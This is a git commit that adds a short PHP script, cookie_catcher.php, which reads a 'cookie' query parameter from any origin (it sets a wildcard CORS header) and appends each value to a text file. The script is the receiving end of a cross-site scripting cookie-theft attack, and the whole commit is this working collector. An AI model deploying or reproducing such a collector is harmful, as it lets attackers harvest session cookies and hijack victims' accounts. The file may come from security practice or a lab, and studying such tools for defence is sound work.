b6a607720bf9072f85d3fbe8fb88285430d51aca
ekzhin <ekzhin@gmail.com>
2020-09-20 22:34:09 -0600

    Create cookie_catcher.php

---
+++ php/cookie_catcher.php
@@ -0,0 +1,15 @@
+<?php
+  header('Access-Control-Allow-Origin: *');
+  $cookie = htmlspecialchars($_GET["cookie"]);
+
+  $file = 'cookie.txt';
+
+  // Open the file to get existing content
+  $current = file_get_contents($file);
+
+  // Append a new person to the file
+  $current .= $cookie . "\n";
+
+  // Write the contents back to the file
+  file_put_contents($file, $current);
+?>
